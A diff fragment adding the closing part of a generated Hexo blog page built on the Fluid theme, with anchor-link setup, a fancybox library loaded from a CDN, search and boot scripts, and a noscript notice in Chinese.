+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
